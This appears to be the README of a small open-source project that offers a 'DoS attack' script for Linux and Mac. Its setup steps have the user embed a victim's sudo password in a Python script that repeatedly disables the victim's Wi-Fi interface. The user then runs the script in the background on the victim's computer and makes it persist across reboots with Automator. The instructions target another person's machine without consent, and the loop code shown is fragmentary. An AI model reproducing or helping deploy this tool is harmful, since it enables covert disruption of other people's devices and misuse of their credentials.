# Auto DoS Attack

A **Simple** script for **DoS** Attacking for **Linux** & **Mac**!

Using Ettercap you can execute this script and perform a local DoS attack to a device.

## Getting Started

To install just clone this repository to a directory. Make sure all files are there.

## Prerequisites

You need to have Ettercap installed. If you already have, proceed to Setting it Up. If not, follow these installation
instructions:

### Linux:

To install on most Linux devices, use this code:
´´´
sudo apt-get install zlib1g zlib1g-dev
sudo apt-get install build-essential
sudo apt-get install ettercap-gtk
´´´
If you get an error, look up the install code for your Linux OS.

### Mac:

To install on Mac OS you need to use Homebrew. Install Homebrew with this code:
´´´
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
´´´
Then, install Ettercap with homebrew:
´´´
brew install ettercap
´´´
If you want the GUI version of Ettercap, use this code (we only need the standard version for
this attack):
´´´
brew install ettercap --with-gtk+
´´´

Ok, now that we have Ettercap installed, let's proceed.

## Setting it up

Open the WifiKillMac.py script with any text editor and edit the password line with
the victim's computer's sudo password. Make sure the user is a sudoer.

```
while loop == 1:
	"sudo ifconfig en0 down"
	"YourSudoPassword"
	time.sleep(10)
```

## Running

Once you have the script on the victim's computer, navigate to the directory where it
is located and run using this command:

```
sudo python WifiKillMac.py &
```
The "&" at the end makes the script run unlimitedly in the background.

## Persistance

The script stops running when the computer is restarted, but there is a way to get round
this. You can use Automator to run a script that executes the script when the computer boots up. Look at [this](https://developer.apple.com/library/content/documentation/AppleApplications/Conceptual/AutomatorConcepts/Articles/ShellScriptActions.html) for more information.

## Version and Contributing

Current version is v1.01

If you want to contribute create a pull request on whatever you want to modify and i will
get back as soon as i can.

## License

This project is licensed under the Apache 2 License - see the [LICENSE.md](LICENSE.md) file for details


## By Marti157
